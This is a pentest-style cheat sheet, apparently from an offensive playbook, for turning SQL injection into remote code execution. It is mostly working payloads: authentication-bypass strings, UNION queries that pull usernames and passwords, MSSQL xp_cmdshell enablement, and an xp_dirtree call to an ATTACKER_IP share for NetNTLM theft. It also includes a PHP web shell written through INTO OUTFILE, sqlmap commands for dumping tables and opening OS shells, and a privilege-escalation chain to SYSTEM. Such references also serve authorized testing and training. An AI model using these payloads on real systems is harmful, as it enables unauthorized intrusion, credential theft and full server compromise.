---
id: sqli-rce
title: SQLi → RCE
stage: initial-access
tags: [web]
tools:
  - sqlmap -r request.txt --batch --dbs
  - sqlmap -r request.txt --batch --os-shell
  - sqlmap -r request.txt --dbms=mssql --batch --level=5 --risk=3
leads_to:
  - rev-shell
  - web-shell
---

## Manual Detection

```
'
"
' OR 1=1-- -
' AND SLEEP(5)-- -
```

## Authentication Bypass

```
admin'--
admin'#
' OR '1'='1'--
' OR 1=1 LIMIT 1--
```

## UNION-Based Extraction

```sql
-- Find column count (increment until error)
' ORDER BY 3--

-- Find printable column
' UNION SELECT NULL,'a',NULL--

-- Extract data
' UNION SELECT username,password,NULL FROM users--
```

## MSSQL → xp_cmdshell

```sql
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';--

-- Steal NetNTLM (start Responder first)
'; EXEC xp_dirtree '\\ATTACKER_IP\share';--
```

## MySQL → Write Web Shell

```sql
' UNION SELECT '<?php system($_GET["cmd"]); ?>',NULL INTO OUTFILE '/var/www/html/shell.php'--
```

## sqlmap

```bash
# From saved Burp request (most reliable)
sqlmap -r request.txt --batch --dbs
sqlmap -r request.txt --batch -D dbname -T users --dump

# With cookie
sqlmap -u "http://$TARGET/page.php?id=1" --cookie "PHPSESSID=abc" --batch --dbs

# Specify DB type
sqlmap -r request.txt --dbms=mysql --batch
sqlmap -r request.txt --dbms=mssql --batch

# WAF bypass
sqlmap -r request.txt --tamper=space2comment --batch

# OS shell (if supported)
sqlmap -r request.txt --batch --os-shell
```

## Notes

MySQL with FILE privilege → write web shell to web root = immediate foothold. MSSQL with sysadmin → xp_cmdshell → whoami /priv → SeImpersonatePrivilege → SYSTEM via GodPotato.
